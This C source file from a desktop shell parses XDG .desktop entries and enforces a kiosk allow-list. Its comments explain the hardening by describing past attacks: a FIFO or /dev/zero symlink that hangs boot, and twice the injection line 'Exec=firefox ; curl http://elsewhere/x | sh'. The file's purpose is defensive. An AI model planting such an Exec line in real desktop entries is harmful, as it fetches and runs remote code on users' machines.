/* apps.c — what is actually installed on this machine.
 *
 * The shell used to know its applications the way a mock-up knows
 * them: a table compiled into it. That is fine until somebody installs
 * something, which is the entire point of owning a computer.
 *
 * XDG desktop entries are how every Linux application announces itself,
 * and reading them is why "install a browser and it appears" needs no
 * cooperation from the shell, the packager or the user. A .deb drops a
 * file in /usr/share/applications and the next scan finds it.
 *
 * The parser is deliberately strict about what it will launch and
 * relaxed about what it will read: a malformed entry is skipped, never
 * guessed at. An entry we cannot parse is one icon missing; an entry we
 * guess at is a command we run on the user's behalf without knowing
 * what it is.
 */
#define _GNU_SOURCE
#include <ctype.h>
#include <dirent.h>
#include <stdio.h>
#include <stdlib.h>
#include <limits.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/stat.h>

#include "shell.h"

/* Where the world puts desktop entries, least specific first so that a
 * user's own copy overrides the system's -- which is the order the XDG
 * base directory specification asks for, and the reason a customised
 * launcher survives a package upgrade. */
static const char *APP_DIRS[] = {
    "/usr/share/applications",
    "/usr/local/share/applications",
    "/var/lib/flatpak/exports/share/applications",
    NULL
};

typedef struct {
    char name[96], comment[160], exec[192], wmclass[64], icon[96], cats[192];
    int  no_display, hidden, terminal, is_app;
    int  name_score;         /* how well the Name= key matched our locale */
} entry;

/* ── the .desktop key=value dialect ─────────────────────────────── */

static void trim(char *s)
{
    char *p = s; while (*p == ' ' || *p == '\t') p++;
    if (p != s) memmove(s, p, strlen(p) + 1);
    size_t n = strlen(s);
    while (n && (s[n-1] == '\n' || s[n-1] == '\r' || s[n-1] == ' ' || s[n-1] == '\t'))
        s[--n] = 0;
}

/* A localised key beats the plain one, and an exact language+country
 * match beats the language alone. Returning a score rather than a
 * boolean is what lets "Name[pt_BR]" win over "Name[pt]" no matter
 * which order they appear in the file. */
static int locale_score(const char *key, const char *base, const char *lang, const char *ll)
{
    size_t bn = strlen(base);
    if (strncmp(key, base, bn) != 0) return -1;
    if (key[bn] == 0) return 1;                        /* the plain key   */
    if (key[bn] != '[') return -1;
    const char *close = strchr(key + bn, ']');
    if (!close) return -1;
    size_t len = (size_t)(close - key - bn - 1);
    if (lang && strlen(lang) == len && !strncmp(key + bn + 1, lang, len)) return 3;
    if (ll   && strlen(ll)   == len && !strncmp(key + bn + 1, ll,   len)) return 2;
    return -1;
}

/* Exec= carries field codes the launcher is meant to substitute. We
 * open applications with no argument, so every one of them is removed
 * rather than passed through -- a literal %U on a command line becomes
 * a file the application cannot find and an error the user cannot
 * explain. */
static void strip_field_codes(char *e)
{
    char *w = e;
    for (char *r = e; *r; r++) {
        if (*r == '%' && r[1]) {
            if (r[1] == '%') { *w++ = '%'; r++; continue; }
            if (strchr("fFuUdDnNickvm", r[1])) { r++; continue; }
        }
        *w++ = *r;
    }
    *w = 0;
    trim(e);
}

static int resolve_program(const char *argv0, char *out, size_t cap);

/* TryExec= names a program whose presence decides whether the entry is
 * shown. The spec says it is a path or a name to look up in PATH; it is
 * not a command line, so it is not split. */
static int have_try_exec(const char *cmd)
{
    char resolved[PATH_MAX];
    return resolve_program(cmd, resolved, sizeof resolved) == 0;
}

/* Open a desktop file the way you open a file you did not write.
 *
 * ~/.local/share/applications is writable by the user, and by anything
 * running as the user. A plain fopen() there was a way to stop the
 * machine booting:
 *
 *   mkfifo hang.desktop     -- open() blocks until someone writes
 *   ln -s /dev/zero z.desktop -- fgets() reads NUL forever, EOF never
 *
 * shell_scan_apps() runs once, before the compositor starts and before
 * the first frame, so either one means the desktop never appears. On a
 * kiosk allow_tty is off, so there is no console to recover from
 * either: one file and the machine does not come back. */
static FILE *open_entry(const char *path)
{
    int fd = open(path, O_RDONLY | O_NONBLOCK | O_NOFOLLOW | O_CLOEXEC);
    if (fd < 0) return NULL;
    struct stat st;
    if (fstat(fd, &st) < 0 || !S_ISREG(st.st_mode)) { close(fd); return NULL; }
    /* Back to blocking now that we know it is a regular file, or fgets
     * would see spurious short reads. */
    int fl = fcntl(fd, F_GETFL);
    if (fl < 0 || fcntl(fd, F_SETFL, fl & ~O_NONBLOCK) < 0) { close(fd); return NULL; }
    FILE *fp = fdopen(fd, "r");
    if (!fp) { close(fd); return NULL; }
    return fp;
}

/* No real desktop entry is anywhere near this big. The cap is what
 * stops a regular file that happens to be a gigabyte from being read a
 * gigabyte at a time during boot. */
#define ENTRY_MAX_BYTES  (256 * 1024)

static int read_entry(const char *path, entry *e, const char *lang, const char *ll)
{
    FILE *fp = open_entry(path);
    if (!fp) return -1;
    memset(e, 0, sizeof *e);
    e->name_score = 0;

    char line[1024];
    int in_group = 0, comment_score = 0, truncated = 0;
    size_t total = 0;
    char try_exec[192] = {0};

    while (fgets(line, sizeof line, fp)) {
        size_t got = strlen(line);
        total += got;
        if (total > ENTRY_MAX_BYTES) break;

        /* A physical line longer than the buffer arrives as two, and
         * the second half was parsed as a fresh key=value. That let a
         * file show one Exec= to anything reading it properly -- glib's
         * key file parser, a packaging lint, a person -- and a
         * different one to us, hidden past 1023 bytes of Comment=. The
         * tail of an over-long line is discarded instead. */
        if (got == sizeof line - 1 && line[got - 1] != '\n') { truncated = 1; continue; }
        if (truncated) { truncated = 0; continue; }

        trim(line);
        if (!line[0] || line[0] == '#') continue;
        if (line[0] == '[') {
            /* Only the main group describes the application itself;
             * the Desktop Action groups after it describe extra menu
             * items, and taking an Exec from one of those launches
             * something other than what the icon says. */
            in_group = !strcmp(line, "[Desktop Entry]");
            continue;
        }
        if (!in_group) continue;

        char *eq = strchr(line, '=');
        if (!eq) continue;
        *eq = 0;
        char *key = line, *val = eq + 1;
        trim(key); trim(val);

        int sc;
        if ((sc = locale_score(key, "Name", lang, ll)) > 0) {
            if (sc >= e->name_score) { snprintf(e->name, sizeof e->name, "%s", val); e->name_score = sc; }
        } else if ((sc = locale_score(key, "Comment", lang, ll)) > 0) {
            if (sc >= comment_score) { snprintf(e->comment, sizeof e->comment, "%s", val); comment_score = sc; }
        } else if (!strcmp(key, "Exec"))            snprintf(e->exec, sizeof e->exec, "%s", val);
        else if (!strcmp(key, "TryExec"))           snprintf(try_exec, sizeof try_exec, "%s", val);
        else if (!strcmp(key, "Icon"))              snprintf(e->icon, sizeof e->icon, "%s", val);
        else if (!strcmp(key, "Categories"))        snprintf(e->cats, sizeof e->cats, "%s", val);
        else if (!strcmp(key, "StartupWMClass"))    snprintf(e->wmclass, sizeof e->wmclass, "%s", val);
        else if (!strcmp(key, "NoDisplay"))         e->no_display = !strcmp(val, "true");
        else if (!strcmp(key, "Hidden"))            e->hidden     = !strcmp(val, "true");
        else if (!strcmp(key, "Terminal"))          e->terminal   = !strcmp(val, "true");
        else if (!strcmp(key, "Type"))              e->is_app     = !strcmp(val, "Application");
    }
    fclose(fp);

    if (!e->is_app || e->hidden || e->no_display) return -1;
    if (!e->exec[0]) return -1;
    strip_field_codes(e->exec);
    if (!e->exec[0]) return -1;
    /* Terminal=true means "run this inside a terminal emulator". With
     * no terminal to run it in, showing the icon would promise a window
     * that never appears. */
    if (e->terminal) return -1;
    /* A TryExec that names a missing program hides the entry -- that is
     * exactly what the key is for. */
    if (try_exec[0] && !have_try_exec(try_exec)) return -1;
    return 0;
}

/* ── turning Exec= into an argument vector ──────────────────────── */

/* The Exec line used to be handed to /bin/sh -c. That made every shell
 * metacharacter in a file the user can write into a command: a
 * semicolon, a backtick, a pipe. It also made the kiosk allow-list
 * meaningless, because "firefox" matched
 *
 *     Exec=firefox ; curl http://elsewhere/x | sh
 *
 * and `sh` matched `sh -c '<anything>'`. There is no shell here now.
 * The line is split per the XDG quoting rules into an argument vector
 * and handed to execv, so the only thing that runs is the program named
 * first -- which is also the thing the allow-list can then check.
 *
 * Writes NUL-separated tokens into `out`, returns how many, or -1. */
static int exec_to_argv(const char *e, char *out, size_t cap, int max_args)
{
    size_t w = 0;
    int n = 0;
    const char *r = e;
    while (*r) {
        while (*r == ' ' || *r == '\t') r++;
        if (!*r) break;
        if (n >= max_args) return -1;
        n++;
        int quoted = 0;
        for (;;) {
            if (!*r) break;
            if (!quoted && (*r == ' ' || *r == '\t')) break;
            if (*r == '"') { quoted = !quoted; r++; continue; }
            if (*r == '\\' && quoted && r[1] &&
                (r[1] == '"' || r[1] == '\\' || r[1] == '`' || r[1] == '$')) r++;
            if (w + 2 >= cap) return -1;
            out[w++] = *r++;
        }
        if (quoted) return -1;            /* an unclosed quote is not a command */
        if (w + 2 >= cap) return -1;
        out[w++] = 0;
    }
    if (!n) return -1;
    out[w] = 0;                           /* a second NUL ends the vector */
    return n;
}

/* The absolute path of the program an argv actually runs, resolved
 * through PATH. This -- not the desktop file's name, not the window
 * class it claims, not the raw Exec string -- is what an allow-list has
 * to be checked against, because it is the only one of the four the
 * person writing the file does not control. */
static int resolve_program(const char *argv0, char *out, size_t cap)
{
    if (!argv0 || !*argv0) return -1;
    if (strchr(argv0, '/')) {
        if (access(argv0, X_OK) != 0) return -1;
        char real[PATH_MAX];
        if (!realpath(argv0, real)) return -1;
        if (strlen(real) + 1 > cap) return -1;
        memcpy(out, real, strlen(real) + 1);
        return 0;
    }
    const char *path = getenv("PATH");
    if (!path) path = "/usr/local/bin:/usr/bin:/bin";
    char buf[PATH_MAX];
    while (*path) {
        const char *sep = strchr(path, ':');
        size_t n = sep ? (size_t)(sep - path) : strlen(path);
        if (n && n + 1 + strlen(argv0) + 1 <= sizeof buf) {
            memcpy(buf, path, n); buf[n] = '/';
            memcpy(buf + n + 1, argv0, strlen(argv0) + 1);
            if (access(buf, X_OK) == 0) {
                char real[PATH_MAX];
                if (!realpath(buf, real)) return -1;
                if (strlen(real) + 1 > cap) return -1;
                memcpy(out, real, strlen(real) + 1);
                return 0;
            }
        }
        if (!sep) break;
        path = sep + 1;
    }
    return -1;
}

/* ── mapping an application to the shell's own vocabulary ───────── */

static int has_cat(const entry *e, const char *cat)
{
    const char *p = e->cats;
    size_t n = strlen(cat);
    while ((p = strstr(p, cat))) {
        int left  = (p == e->cats) || p[-1] == ';';
        int right = (p[n] == ';' || p[n] == 0);
        if (left && right) return 1;
        p += n;
    }
    return 0;
}

/* The icons are drawn from primitives, so an application is matched to
 * the nearest thing the shell can draw rather than to an icon theme we
 * would then have to ship, scale and recolour. It is also why a Somali
 * translation of the desktop needs no new artwork. */
static shell_icon icon_for(const entry *e)
{
    if (has_cat(e, "WebBrowser"))                        return ICON_GLOBE;
    if (has_cat(e, "Email"))                             return ICON_MAIL;
    if (has_cat(e, "TerminalEmulator"))                  return ICON_TERMINAL;
    if (has_cat(e, "Calculator"))                        return ICON_CALC;
    if (has_cat(e, "FileManager") || has_cat(e, "FileTools")) return ICON_FILES;
    if (has_cat(e, "Settings")   || has_cat(e, "System")) return ICON_SETTINGS;
    if (has_cat(e, "Photography")|| has_cat(e, "Graphics")) return ICON_PHOTOS;
    if (has_cat(e, "Audio")      || has_cat(e, "Music")
     || has_cat(e, "AudioVideo") || has_cat(e, "Video"))  return ICON_MUSIC;
    if (has_cat(e, "TextEditor") || has_cat(e, "Office")
     || has_cat(e, "WordProcessor"))                      return ICON_TEXT;
    if (has_cat(e, "Documentation"))                      return ICON_HELP;
    if (has_cat(e, "Network"))                            return ICON_GLOBE;
    return ICON_WINDOW;
}

/* What the user reaches for first should be first. Everything else is
 * alphabetical, because any other order is one the user has to learn. */
static int rank_of(const entry *e)
{
    if (has_cat(e, "WebBrowser"))                             return 0;
    if (has_cat(e, "FileManager") || has_cat(e, "FileTools")) return 1;
    if (has_cat(e, "Email"))                                  return 2;
    if (has_cat(e, "TextEditor"))                             return 3;
    if (has_cat(e, "Settings"))                               return 8;
    return 5;
}

/* ── the scan ───────────────────────────────────────────────────── */

typedef struct { entry e; char file[128]; int rank;
                 char argv[sizeof ((entry *)0)->exec]; int nargs; } found;

static int cmp_found(const void *a, const void *b)
{
    const found *x = a, *y = b;
    if (x->rank != y->rank) return x->rank - y->rank;
    return strcasecmp(x->e.name, y->e.name);
}

/* A kiosk's allow-list is an allow-list, and it is a security control:
 * on a managed machine it is the only thing limiting what can run, and
 * allow_tty is off so there is no console to escape to.
 *
 * It is matched against the resolved absolute path of the program the
 * entry runs, and its basename. Nothing else. The three things it used
 * to accept -- the desktop file's name, the StartupWMClass it declares,
 * and the raw Exec string -- are all written by whoever wrote the file,
 * and anyone who can drop a file in ~/.local/share/applications could
 * therefore name it firefox.desktop, or claim StartupWMClass=firefox,
 * or write `Exec=firefox ; curl http://elsewhere/x | sh`, and be
 * allowed. The Exec test was the worst of the three: it accepted any
 * suffix after a space, so an entry for `sh` matched `sh -c <anything>`.
 *
 * Checked where the table is built rather than at launch, because an
 * icon a student can see and press and that then refuses teaches a room
 * full of teenagers exactly where the edges are. */
/* Does `program` appear in this whitespace-or-comma separated list, by
 * its full resolved path or by its basename? Whole token against whole
 * name -- no prefixes, no suffixes. */
static int named_in(const char *list, const char *program)
{
    if (!list || !*list || !program || !*program) return 0;
    const char *base = strrchr(program, '/');
    base = base ? base + 1 : program;
    const char *p = list;
    while (*p) {
        while (*p == ' ' || *p == ',') p++;
        const char *s = p;
        while (*p && *p != ' ' && *p != ',') p++;
        size_t n = (size_t)(p - s);
        if (!n) continue;
        if (strlen(base)    == n && !strncmp(base,    s, n)) return 1;
        if (strlen(program) == n && !strncmp(program, s, n)) return 1;
    }
    return 0;
}

static int allowed(const shell_ctx *c, const char *program)
{
    if (c->deny_all_apps) return 0;
    /* Deny beats allow, and is checked first: a program named in both
     * lists is a mistake by whoever wrote the profile, and the safe
     * reading of a contradictory lockdown is the restrictive one. */
    if (named_in(c->blocked_apps, program)) return 0;
    if (!c->allowed_apps[0]) return 1;
    if (!program || !*program) return 0;

    const char *base = strrchr(program, '/');
    base = base ? base + 1 : program;

    const char *p = c->allowed_apps;
    while (*p) {
        while (*p == ' ' || *p == ',') p++;
        const char *s = p;
        while (*p && *p != ' ' && *p != ',') p++;
        size_t n = (size_t)(p - s);
        if (!n) continue;
        /* Whole token against whole name. No prefixes, no suffixes. */
        if (strlen(base)    == n && !strncmp(base,    s, n)) return 1;
        if (strlen(program) == n && !strncmp(program, s, n)) return 1;
    }
    return 0;
}

int shell_scan_apps(shell_ctx *c)
{
    const char *lang_env = getenv("LC_ALL");
    if (!lang_env || !*lang_env) lang_env = getenv("LC_MESSAGES");
    if (!lang_env || !*lang_env) lang_env = getenv("LANG");
    char lang[16] = {0}, ll[8] = {0};
    if (lang_env && *lang_env) {
        snprintf(lang, sizeof lang, "%s", lang_env);
        char *dot = strchr(lang, '.'); if (dot) *dot = 0;
        char *at  = strchr(lang, '@'); if (at)  *at  = 0;
        snprintf(ll, sizeof ll, "%s", lang);
        char *us = strchr(ll, '_'); if (us) *us = 0;
    }

    /* A user's own directory comes last so that its copy of a desktop
     * file replaces the system one, per the XDG search order. */
    char home_dir[256] = {0};
    const char *home = getenv("HOME");
    if (home && *home) snprintf(home_dir, sizeof home_dir, "%s/.local/share/applications", home);

    found *list = calloc(512, sizeof *list);
    if (!list) return -1;
    int n = 0, any_dir = 0;

    const char *dirs[8]; int n_dirs = 0;
    for (int d = 0; APP_DIRS[d] && n_dirs < 7; d++) dirs[n_dirs++] = APP_DIRS[d];
    /* Not on a managed machine. The user directory is searched last so
     * that a customised launcher overrides the system one -- which is
     * the correct XDG behaviour and exactly the wrong thing where an
     * allow-list is in force, because the override would let a student
     * replace the allowed browser's entry with their own. */
    int locked = c->deny_all_apps || c->allowed_apps[0] || c->kiosk;
    if (home_dir[0] && !locked) dirs[n_dirs++] = home_dir;

    for (int d = 0; d < n_dirs; d++) {
        const char *dir = dirs[d];
        DIR *dp = opendir(dir);
        if (!dp) continue;
        any_dir = 1;

        struct dirent *de;
        while ((de = readdir(dp)) && n < 512) {
            size_t len = strlen(de->d_name);
            if (len < 9 || strcmp(de->d_name + len - 8, ".desktop")) continue;

            char path[512];
            snprintf(path, sizeof path, "%s/%s", dir, de->d_name);
            entry e;
            if (read_entry(path, &e, lang[0] ? lang : NULL, ll[0] ? ll : NULL) < 0) continue;
            if (!e.name[0]) snprintf(e.name, sizeof e.name, "%s", de->d_name);

            /* Split first, so the allow-list sees the real program. */
            char argv_blob[sizeof e.exec];
            int nargs = exec_to_argv(e.exec, argv_blob, sizeof argv_blob, APP_MAX_ARGS);
            if (nargs < 1) continue;
            char program[PATH_MAX];
            if (resolve_program(argv_blob, program, sizeof program) < 0) continue;
            if (!allowed(c, program)) continue;

            char stem[128];
            snprintf(stem, sizeof stem, "%.*s", (int)(len - 8), de->d_name);

            /* Later directory wins, which is the whole reason the user
             * directory is searched last. */
            int slot = -1;
            for (int i = 0; i < n; i++) if (!strcmp(list[i].file, stem)) { slot = i; break; }
            if (slot < 0) { slot = n++; snprintf(list[slot].file, sizeof list[slot].file, "%s", stem); }
            list[slot].e = e;
            list[slot].rank = rank_of(&e);
            memcpy(list[slot].argv, argv_blob, sizeof argv_blob);
            list[slot].nargs = nargs;
        }
        closedir(dp);
    }

    if (!any_dir) { free(list); return -1; }
    qsort(list, (size_t)n, sizeof *list, cmp_found);

    int keep = n < SHELL_MAX_APPS ? n : SHELL_MAX_APPS;
    for (int i = 0; i < keep; i++) {
        app_entry *a = &c->apps[i];
        memset(a, 0, sizeof *a);
        snprintf(a->id,   sizeof a->id,   "%s", list[i].file);
        snprintf(a->name, sizeof a->name, "%s", list[i].e.name);
        snprintf(a->hint, sizeof a->hint, "%s", list[i].e.comment);
        memcpy(a->exec, list[i].argv, sizeof a->exec);
        a->n_args = list[i].nargs;
        /* When an application does not declare its window class, the
         * desktop file's own name is what GTK and Qt report as app_id
         * -- which is how a window that appears gets matched back to
         * the icon that started it. */
        snprintf(a->wm_class, sizeof a->wm_class, "%s",
                 list[i].e.wmclass[0] ? list[i].e.wmclass : list[i].file);
        a->icon   = icon_for(&list[i].e);
        /* One ink, like the seeded table -- see shell_seed_apps(). A
         * row of differently tinted marks is decoration standing in for
         * hierarchy, and colour here means state. */
        a->tint   = c->fg;
        a->pinned = (i < 4);
    }
    c->n_apps = keep;
    /* Settings is the shell's own, not a package's: without it a user
     * who changes nothing else still has no way to change the one thing
     * the product promises they can. */
    if (c->allow_settings && keep < SHELL_MAX_APPS && !c->kiosk) {
        app_entry *a = &c->apps[keep];
        memset(a, 0, sizeof *a);
        snprintf(a->id,   sizeof a->id,   "settings");
        snprintf(a->name, sizeof a->name, "Settings");
        snprintf(a->hint, sizeof a->hint, "Change how this computer looks and works");
        a->icon = ICON_SETTINGS;
        a->tint = c->fg;
        c->n_apps = ++keep;
    }
    free(list);
    return keep;
}
